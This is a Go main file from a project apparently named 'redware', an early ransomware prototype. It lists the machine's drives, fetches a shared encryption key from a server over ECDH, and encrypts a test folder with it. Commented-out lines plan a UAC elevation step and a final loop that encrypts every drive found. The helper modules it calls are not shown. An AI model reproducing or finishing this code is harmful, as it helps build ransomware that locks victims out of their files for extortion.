package main

import (
	"fmt"

	"github.com/Redhead92/Workspace/tree/main/redware/Block1_Crypt/foldercrypt"
	"github.com/Redhead92/Workspace/tree/main/redware/Block2_Fwalk/filewalk"
	"github.com/Redhead92/Workspace/tree/main/redware/Block3_Keyman/keygen"
)

func main() {
	//Check whether file is being run as admin. If not restart application with UAC prompt.
	//if !filewalk.AmAdmin(){
	//	filewalk.RunMeElevated()
	//}
	
	dirs := filewalk.GetDrives()
	fmt.Printf("Drives found: %v \n", dirs)
	//Remove after testing
	testfolder := "C:/Users/super/Desktop/test/"
	//key fetching
	sharedKey, err := keygen.TgECDHgen()
	if err == nil{
		fmt.Printf("\n Shared key hex = %x\n", sharedKey[:])

		// Encrypt folder/files
		foldercrypt.Foldercrypt(testfolder, sharedKey[:])
	}else{
		fmt.Printf("Server (connection) error: %v", err)
	}

	//final code, loop through all drives found and encrypt them
	// for _, dir := range dirs{
	// 	foldercrypt.Foldercrypt(input,dir,testkey)
	// }
}
